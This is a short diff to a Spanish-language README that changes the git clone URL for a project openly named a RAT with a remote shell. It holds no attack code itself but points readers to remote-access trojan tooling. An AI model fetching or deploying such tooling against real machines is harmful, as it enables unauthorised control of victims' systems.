@@ -14,7 +14,7 @@ Para obtener **Python 3.9.X** dirigete a este link: **[Python Download](https://
 **Una vez instalado (Git) ejecuta en la consola en la ruta que gustes el siguiente comando:**
 
 ```
-git clone https://github.com/TheWORLD1886/Alretix_RAT.git
+git clone https://github.com/TheWORLD1886/Alretix-RAT-Remote-Shell.git
 ```
 o<br>
 **Puedes omitir el paso anterior descargando todo el Source Code en un .ZIP:**<br>
